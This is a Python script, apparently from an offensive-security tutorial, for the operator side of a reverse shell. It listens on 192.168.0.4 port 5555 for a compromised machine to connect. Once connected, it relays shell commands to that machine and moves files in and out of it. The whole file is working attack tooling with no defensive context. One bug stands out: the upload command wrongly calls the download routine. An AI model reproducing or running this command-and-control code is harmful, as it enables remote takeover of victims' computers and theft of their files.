import socket
import json
import os

def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())

def reliable_receive():
    data = ''
    while True:
        try:
            data = data+ target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
        
def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())
    
def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def target_communication():
    while True:
        data = input('* Shell~%s: ' % str(ip))
        reliable_send(data)
        if data == 'exit':
            break
        elif data == 'clear':
            os.system('clear')
        elif data[:3] == 'cd ':
            pass
        elif data[:8] == 'download':
            download_file(data[9:])
        elif data[:6] == 'upload':
            download_file(data[7:])
        else:
            result = reliable_receive()
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.0.4', 5555))

print('[+] Listening on 192.168.0.4:5555')
sock.listen(5)

target, ip = sock.accept()
print('[+] Accepted connection from %s' % ip)
target_communication()